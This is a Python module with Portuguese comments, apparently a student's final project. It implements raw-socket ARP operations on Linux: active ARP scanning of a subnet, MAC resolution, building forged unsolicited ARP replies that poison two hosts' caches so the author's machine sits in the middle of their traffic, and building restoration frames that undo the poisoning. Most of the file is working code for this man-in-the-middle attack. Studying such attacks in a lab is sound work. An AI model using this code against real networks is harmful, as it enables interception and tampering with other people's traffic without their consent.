"""Operacoes ARP de baixo nivel sobre socket AF_PACKET (Trabalho Final).

Reune tudo que "fala ARP" na camada de enlace, usando apenas raw sockets da
biblioteca padrao: descoberta de hosts ativos, envenenamento de cache e cura
(restauracao). O enquadramento dos pacotes vem de decoders.montar_arp/parse_arp;
aqui ficam o socket, o endereco local e os lacos de envio/escuta.

Tudo depende de Linux (AF_PACKET) e de privilegios de root/CAP_NET_RAW.
"""
import fcntl
import select
import socket
import struct
import time

from decoders import (
    ETH_P_ALL, ETHERTYPE_ARP, ARP_OP_REQUEST, ARP_OP_REPLY,
    MAC_BROADCAST, MAC_ZERO,
    parse_ethernet, parse_arp, montar_arp, mac_para_texto,
)

# Numeros de ioctl para consultar a interface (de <linux/sockios.h>)
SIOCGIFHWADDR = 0x8927      # MAC da interface
SIOCGIFADDR = 0x8915       # IPv4 da interface
SIOCGIFNETMASK = 0x891B    # mascara da interface


def abrir_socket(iface):
    """Abre um socket AF_PACKET cru ligado a interface e retorna o socket."""
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.bind((iface, 0))
    return s


def obter_mac(iface):
    """Le o MAC (6 bytes) da interface via ioctl SIOCGIFHWADDR."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        info = fcntl.ioctl(s.fileno(), SIOCGIFHWADDR,
                           struct.pack("256s", iface.encode()[:15]))
        return info[18:24]
    finally:
        s.close()


def _ioctl_ip(iface, op):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        info = fcntl.ioctl(s.fileno(), op,
                           struct.pack("256s", iface.encode()[:15]))
        return socket.inet_ntoa(info[20:24])
    finally:
        s.close()


def obter_ip(iface):
    """IPv4 configurado na interface (texto)."""
    return _ioctl_ip(iface, SIOCGIFADDR)


def obter_mascara(iface):
    """Mascara de rede da interface (texto)."""
    return _ioctl_ip(iface, SIOCGIFNETMASK)


def _ip_para_int(ip):
    return struct.unpack("!I", socket.inet_aton(ip))[0]


def _int_para_ip(n):
    return socket.inet_ntoa(struct.pack("!I", n))


def listar_enderecos_da_rede(ip, mascara):
    """Lista todos os IPs de host da sub-rede (exceto rede e broadcast)."""
    ip_n = _ip_para_int(ip)
    mask_n = _ip_para_int(mascara)
    rede = ip_n & mask_n
    broadcast = rede | (~mask_n & 0xFFFFFFFF)
    return [_int_para_ip(n) for n in range(rede + 1, broadcast)]


def descobrir_hosts(sock, iface, meu_ip, meu_mac, mascara, timeout=3.0):
    """Varredura ARP ativa: pergunta "quem tem X?" para cada IP da sub-rede.

    Envia um ARP Request em broadcast para todos os enderecos da sub-rede e
    escuta as respostas por `timeout` segundos. Retorna uma lista de dicts
    {ip, mac} com os nos ativos encontrados (o proprio atacante e omitido).
    """
    alvos = listar_enderecos_da_rede(meu_ip, mascara)
    meu_ip_b = socket.inet_aton(meu_ip)

    # Dispara as perguntas. Num ARP Request o THA e desconhecido (00:00:..) e o
    # destino Ethernet e o broadcast (ff:ff:..), conforme a RFC 826.
    for ip in alvos:
        if ip == meu_ip:
            continue
        quadro = montar_arp(ARP_OP_REQUEST, meu_mac, meu_ip_b,
                            MAC_ZERO, socket.inet_aton(ip), eth_dst=MAC_BROADCAST)
        try:
            sock.send(quadro)
        except OSError:
            pass

    # Coleta as respostas ate o timeout
    encontrados = {}
    limite = time.time() + timeout
    while time.time() < limite:
        pronto, _, _ = select.select([sock], [], [], max(0, limite - time.time()))
        if not pronto:
            continue
        frame = sock.recv(65535)
        eth = parse_ethernet(frame)
        if not eth or eth[2] != ETHERTYPE_ARP:
            continue
        arp = parse_arp(eth[3])
        if not arp or arp["oper"] != ARP_OP_REPLY:
            continue
        ip_r = arp["ip_remetente"]
        mac_r = arp["mac_remetente"]
        if ip_r != meu_ip:
            encontrados[ip_r] = mac_r
    return [{"ip": ip, "mac": mac} for ip, mac in sorted(
        encontrados.items(), key=lambda kv: _ip_para_int(kv[0]))]


def resolver_mac(sock, iface, meu_ip, meu_mac, ip_alvo, timeout=2.0, tentativas=3):
    """Descobre o MAC de um IP especifico via ARP Request (para cura/validacao)."""
    meu_ip_b = socket.inet_aton(meu_ip)
    alvo_b = socket.inet_aton(ip_alvo)
    for _ in range(tentativas):
        quadro = montar_arp(ARP_OP_REQUEST, meu_mac, meu_ip_b, MAC_ZERO, alvo_b,
                            eth_dst=MAC_BROADCAST)
        sock.send(quadro)
        limite = time.time() + timeout
        while time.time() < limite:
            pronto, _, _ = select.select([sock], [], [], max(0, limite - time.time()))
            if not pronto:
                continue
            eth = parse_ethernet(sock.recv(65535))
            if not eth or eth[2] != ETHERTYPE_ARP:
                continue
            arp = parse_arp(eth[3])
            if arp and arp["oper"] == ARP_OP_REPLY and arp["ip_remetente"] == ip_alvo:
                return arp["mac_remetente"]
    return None


def quadro_de_veneno(meu_mac, ip_que_finjo_ser, mac_destino, ip_destino):
    """Monta um ARP Reply forjado (nao solicitado / gratuitous).

    Diz ao `ip_destino` que `ip_que_finjo_ser` esta no MEU MAC. Enviado
    periodicamente aos dois extremos, posiciona o atacante no meio.
    """
    return montar_arp(
        ARP_OP_REPLY,
        meu_mac, socket.inet_aton(ip_que_finjo_ser),      # remetente forjado
        texto_para_mac_bytes(mac_destino), socket.inet_aton(ip_destino),  # alvo
    )


def quadro_de_cura(mac_verdadeiro_de, ip_de, mac_destino, ip_destino):
    """Monta um ARP Reply legitimo para restaurar a cache de `ip_destino`.

    Reanuncia que `ip_de` esta no seu MAC verdadeiro (`mac_verdadeiro_de`),
    desfazendo o envenenamento. Disparado em rajada no encerramento.
    """
    return montar_arp(
        ARP_OP_REPLY,
        texto_para_mac_bytes(mac_verdadeiro_de), socket.inet_aton(ip_de),
        texto_para_mac_bytes(mac_destino), socket.inet_aton(ip_destino),
    )


def texto_para_mac_bytes(mac):
    """Aceita MAC em texto ('aa:..') ou ja em bytes e devolve 6 bytes."""
    if isinstance(mac, bytes):
        return mac
    return bytes(int(p, 16) for p in mac.split(":"))
